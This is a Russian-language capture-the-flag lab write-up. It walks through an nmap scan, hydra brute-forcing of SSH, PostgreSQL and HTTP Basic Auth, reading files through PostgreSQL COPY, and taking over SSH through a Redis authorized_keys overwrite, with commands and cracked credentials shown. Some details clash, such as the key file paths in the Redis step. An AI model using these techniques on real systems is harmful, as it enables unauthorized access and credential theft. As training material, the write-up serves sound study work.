# Просканируйте сеть

### Описание
Одним из первых действий, которые выполняет атакующий, является активная разведка – он сканирует сеть, чтобы узнать больше о ее структуре, сервисах и уязвимостях.
Он может использовать сканирование портов – идентификацию открытых портов и сервисов, работающих на целевых системах. Атакующий ищет сервисы, которые могут быть уязвимы для эксплуатации, такие как SSH, SMB, HTTP, FTP и другие.

Популярным инструментом для этого является nmap. Пример быстрого запуска сканирования с nmap:

```bash
nmap 10.184.48.5/24
```
 
Просканируйте сеть, в которой вы находитесь прямо сейчас. Сколько хостов (включая узел атакующего) активны?

### Solve

```bash
root@attackerLogin:~# nmap 10.184.48.5/20
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-14 13:08 UTC
Stats: 0:00:03 elapsed; 0 hosts completed (0 up), 4095 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 21.05% done; ETC: 13:08 (0:00:11 remaining)
Nmap scan report for 10.184.48.1
Host is up (0.0040s latency).
All 1000 scanned ports on 10.184.48.1 are filtered
MAC Address: FE:00:00:00:01:01 (Unknown)

Nmap scan report for 10.184.48.2
Host is up (0.0011s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5432/tcp open  postgresql
MAC Address: BE:80:FB:02:96:55 (Unknown)

Nmap scan report for 10.184.48.3
Host is up (0.00088s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5432/tcp open  postgresql
MAC Address: DA:9D:7C:CC:79:11 (Unknown)

Nmap scan report for 10.184.48.4
Host is up (0.00081s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5432/tcp open  postgresql
MAC Address: B2:B0:69:07:9F:E5 (Unknown)

Nmap scan report for 10.184.48.6
Host is up (0.0011s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5432/tcp open  postgresql
MAC Address: 1A:FA:6C:38:77:23 (Unknown)

Nmap scan report for attackerLogin (10.184.48.5)
Host is up (0.000011s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 4096 IP addresses (6 hosts up) scanned in 21.09 seconds
```

Но правильный ответ почему-то 5, вероятно без учета 10.184.48.1.

### TIP

Можно решить эту задачу и вот так: nmap -sn <network> | grep "Host is up" | wc -l

# Брутфорс SSH

Hydra (также известный как THC-Hydra) — это быстрый и гибкий инструмент для взлома паролей, используемый для перебора учетных данных различных сетевых сервисов. Hydra пытается угадать или "взломать" пароль, используя список возможных паролей (wordlist) для заданного сервиса (например, SSH, FTP, HTTP и др.), пока не найдет правильный или не исчерпает список.

Используйте предустановленный инструмент hydra и базу паролей, находящуюся в файле /root/passwords.txt, чтобы выполнить brute-force атаку на SSH пользователя userdefbox@10.184.48.4.

Получите флаг с 10.184.48.4, он находится в файле: /flag.txt

### Solve

```bash
root@attackerLogin:~# hydra -l userdefbox -P /root/passwords.txt 10.184.48.4 -s 22 ssh -vV -I
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-14 13:13:59
[DATA] max 4 tasks per 1 server, overall 4 tasks, 94 login tries (l:1/p:94), ~24 tries per task
[DATA] attacking ssh://10.184.48.4:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://userdefbox@10.184.48.4:22
[INFO] Successful, password authentication is supported by ssh://10.184.48.4:22
[ATTEMPT] target 10.184.48.4 - login "userdefbox" - pass "123456" - 1 of 94 [child 0] (0/0)
.
.
.
[22][ssh] host: 10.184.48.4   login: userdefbox   password: password123!@#
[STATUS] attack finished for 10.184.48.4 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-14 13:17:28
```

Далее логинимся и получаем флаг

```bash
root@attackerLogin:~# ssh userdefbox@10.184.48.4
$ ls
flag.txt
$ cat flag.txt
Imem8ErhYdr4
```

Вернее

```bash
$ cat /flag.txt
defbox{qnoz7gxjug}
```

# Брутфорс PostgreSQL

Введите пароль от базы данных в качестве флага ниже.

### Задача
Выполните brute-force атаку на экземпляр PostgreSQL, работающий здесь 10.184.48.3.
Используйте список паролей /root/passwords.txt для подбора пароля к сервису PostgreSQL.

Данные для входа:

Пользователь: postgres
Цель: 10.184.48.3

### Solve

```bash
root@attackerLogin:~# hydra -l postgres -P /root/passwords.txt 10.184.48.3 postgres -t 16 -f -vV -I
[STATUS] attack finished for 10.184.48.3 (waiting for children to complete tests)
[5432][postgres] host: 10.184.48.3   login: postgres   password: MOOS1cooraib6dull
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-14 13:23:36
```

# Брутфорс Basic Auth

### Задача
Используйте предустановленный инструмент hydra и базу паролей, находящуюся в файле /root/passwords.txt, чтобы выполнить brute-force атаку на Basic auth сервера http://159.65.195.19.

Пользователь - defbox
Адрес сервера - http://159.65.195.19

### Solve

```bash
root@attackerLogin:~# hydra -l defbox -P /root/passwords.txt 159.65.195.19 http-get /
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-14 13:26:12
[DATA] max 16 tasks per 1 server, overall 16 tasks, 94 login tries (l:1/p:94), ~6 tries per task
[DATA] attacking http-get://159.65.195.19:80/
[80][http-get] host: 159.65.195.19   login: defbox   password: jennifer
1 of 1 target successfully completed, 1 valid password found
```

Логинимся:

```bash
root@attackerLogin:~# curl -u defbox:jennifer http://159.65.195.19/
ssetoicinnns+cilasitttottsoirtue
```

# Exploit PostgreSQL

### Task

Получите содержимое файла /flag.txt.
Подключитесь к PostgreSQL на удаленной машине с использованием найденной учетной записи.
Используйте psql чтобы получить доступ до хостовой системы.

### Solve

Login

```bash
root@attackerLogin:~# psql -h 10.184.48.3 -U postgres -W
Password: MOOS1cooraib6dull
```

Exploit

```postgres
postgres=# CREATE TABLE temp_flag (content text);
CREATE TABLE
postgres=# COPY temp_flag FROM '/flag.txt';
COPY 1
postgres=# SELECT * FROM temp_flag;
      content       
--------------------
 defbox{o9pikadryp}
(1 row)
postgres=#
```

### TIP

Можно сказать, что доступ к базе данных с использованием учетных данных — это инцидент безопасности. Даже если это тестовая база данных без важной информации, злоумышленник может развить атаку используя команду COPY в PostgreSQL.

# Exploit Redis

### Task

Redis — это база данных, которая по умолчанию позволяет анонимный доступ. Оставлять её открытой опасно — это может привести к удаленному выполнению кода и даже захвату сервера.

Экземпляр Redis по адресу 10.184.48.2 позволяет выгрузить базу данных и перезаписать файл authorized_keys для пользователя Redis своим собственным ключом. Используйте эту уязвимость, чтобы прочитать флаг, который находится в файле /flag.txt.

### Solve

Создаем ssh ключ:

```bash
root@attackerLogin:~# ssh-keygen -t rsa -f /tmp/key
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/key
Your public key has been saved in /tmp/key.pub
The key fingerprint is:
SHA256:JUAdr2d9p+hWReVZPtHN6MYD7Lnk2CMLlohnSNcZmpI root@attackerLogin
The key's randomart image is:
+---[RSA 3072]----+
|     .o... .   +*|
|       .o.  o .oO|
|     . +.oo. = +o|
|    E + o+ .+ = o|
|   . = .S.o=.o.o.|
|    o + +oo =o.o |
|     o . . o.o.  |
|          ...    |
|           ..    |
+----[SHA256]-----+
```

Подготовка ключа для redis:

```bash
(echo -e "\n\n"; cat /tmp/key.pub; echo -e "\n\n") > /tmp/redis_key.txt
```

Загрузка ключа в redis:

```bash
cat /tmp/redis_key.txt | redis-cli -h 10.184.48.2 -x set crackit
```

Настройка Redis для записи в authorized_keys:

```bash
root@attackerLogin:~# cat /tmp/redis_key.txt | redis-cli -h 10.184.48.2 -x set crackit
OK
root@attackerLogin:~# redis-cli -h 10.184.48.2 config set dir /var/lib/redis/.ssh/
OK
root@attackerLogin:~# redis-cli -h 10.184.48.2 config set dbfilename "authorized_keys"
OK
root@attackerLogin:~# redis-cli -h 10.184.48.2 save
OK
```

Подключение по SSH:

```bash
root@attackerLogin:~# chmod 600 /tmp/redis_key
root@attackerLogin:~# ssh -i /tmp/redis_key redis@10.184.48.2
The authenticity of host '10.184.48.2 (10.184.48.2)' can't be established.
ED25519 key fingerprint is SHA256:2+DIzLPCsor8jrSirIpQpSe3dSEUsYLsAsGQxIgLUcQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.184.48.2' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-130-generic x86_64)
.
.
.
redis@redisNologin:~$ cat /flag.txt
defbox{grlg64lwv6}
```

### TIP

Неверные настройки в PostgreSQL и Redis всё ещё могут быть использованы в атаках, даже если они работают в контейнерах. Однако изоляция контейнера и правильные настройки безопасности могут помочь снизить риски.






